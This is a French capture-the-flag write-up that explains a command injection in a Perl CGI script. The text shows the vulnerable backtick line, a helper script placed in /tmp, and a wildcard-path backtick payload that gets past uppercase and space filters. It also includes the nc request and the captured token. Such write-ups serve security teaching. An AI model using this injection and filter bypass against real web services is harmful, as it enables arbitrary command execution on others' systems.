# Niveau 12 : Injection de Commande via Script Perl CGI

Ce document explique la vulnérabilité dans le script `level12.pl` et les étapes suivies pour l'exploiter.

## 1. Explication du Script

La cible est un script Perl CGI (`level12.pl`) écoutant sur `localhost:4646`.

Parties clés du script :

-   Il utilise le module CGI pour obtenir les paramètres `x` et `y` de la requête :
    ```perl
    use CGI qw{param};
    # ... plus tard ...
    n(t(param("x"), param("y")));
    ```
-   La sous-routine `t` traite le paramètre `x` :
    -   Le convertit en majuscules : `$xx =~ tr/a-z/A-Z/;`
    -   Supprime tout après le premier espace : `$xx =~ s/\s.*//;`
    ```perl
    sub t {
      $nn = $_[1]; # param y
      $xx = $_[0]; # param x
      $xx =~ tr/a-z/A-Z/;
      $xx =~ s/\s.*//;
      # ...
    }
    ```
-   Il utilise ensuite la valeur traitée `$xx` directement dans une commande shell exécutée via des backticks (apostrophes inverses) :
    ```perl
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    ```
-   Le script vérifie si une ligne retournée par `egrep`, spécifiquement la partie après le premier deux-points (`:`), correspond au paramètre `y` (`$nn`) en tant qu'expression régulière (regex). Il affiche `..` si ça correspond et `.` sinon.

## 2. Analyse de la Vulnérabilité

La vulnérabilité principale est une **Injection de Commande** dans la ligne :
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
Le script intègre directement la variable `$xx` contrôlée par l'utilisateur (bien que modifiée) dans une chaîne de commande exécutée par le shell du système via des backticks.

**Défis :**

1.  **Conversion en Majuscules :** `$xx =~ tr/a-z/A-Z/;` empêche l'injection directe de commandes en minuscules (comme `getflag`).
2.  **Suppression des Espaces :** `$xx =~ s/\s.*//;` empêche l'injection de commandes avec des espaces ou des arguments séparés par des espaces.

## 3. Méthode d'Exploitation

La vulnérabilité a été exploitée en contournant les limitations de la conversion en majuscules et de la suppression des espaces pour exécuter la commande `getflag` et rediriger sa sortie vers un fichier lisible.

**Étapes :**

1.  **Créer un Script Auxiliaire :** Un script auxiliaire a été créé à `/tmp/GETFLAG`. Crucialement, ce script contenait *lui-même* la commande et la redirection nécessaires :
    ```bash
    # Commande exécutée dans le shell :
    echo "getflag > /tmp/FLAG" > /tmp/GETFLAG
    chmod +x /tmp/GETFLAG
    ```
    Lorsque `/tmp/GETFLAG` est exécuté, il lance `getflag` et écrit la sortie dans `/tmp/FLAG`.

2.  **Construire le code d'exploitation:** Le paramètre `x` a été conçu pour exécuter le script auxiliaire en utilisant des backticks et un chemin avec joker (`*`) :
    *   Payload : `` `/*/GETFLAG` ``
    *   Ce code d'exploitation ne contient pas d'espaces, évitant le problème de la suppression des espaces.
    *   Le joker `*` n'est pas affecté par la conversion en majuscules.

3.  **Envoyer la Requête :** Le code d'exploitation a été envoyée au script via `nc` (l'encodage URL n'était pas strictement nécessaire ici car les caractères critiques `*`, `/`, `` ` `` passent souvent, mais encoder en `%60%2A%2FGETFLAG%60` fonctionnerait aussi) :
    ```http
    GET /?x=`/*/GETFLAG`&y=a HTTP/1.0
    ```
    (Suivi de deux appuis sur Entrée)

4.  **Trace d'Exécution :**
    *   Le script Perl reçoit `` x=`/*/GETFLAG` ``.
    *   Convertit en majuscules : ``$xx = `/*/GETFLAG` ``.
    *   Supprime les espaces (aucun) : `$xx` reste `` `/*/GETFLAG` ``.
    *   Commande exécutée par Perl : `` `egrep "^`/*/GETFLAG`" /tmp/xd 2>&1` ``.
    *   Le shell exécute les backticks internes : `` `/*/GETFLAG` ``.
    *   Le shell développe `/*/GETFLAG` en `/tmp/GETFLAG`.
    *   Le shell exécute le script `/tmp/GETFLAG`.
    *   `/tmp/GETFLAG` exécute `getflag > /tmp/FLAG`, écrivant le flag dans `/tmp/FLAG`.
    *   Les backticks internes ne produisent aucune sortie standard (à cause de la redirection).
    *   La commande `egrep` externe s'exécute sur un préfixe de motif vide.
    *   Le script Perl affiche `.` (aucune correspondance trouvée basée sur la sortie de `egrep`).

5.  **Récupérer le Flag :** Le flag a été lu depuis le fichier de sortie :
    ```bash
    cat /tmp/FLAG
    ```
    Sortie : `Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr`

Cette méthode a astucieusement utilisé un chemin avec joker dans une substitution de commande pour contourner la validation d'entrée du script et exécuter la commande souhaitée indirectement via le script auxiliaire, redirigeant la sortie avec succès.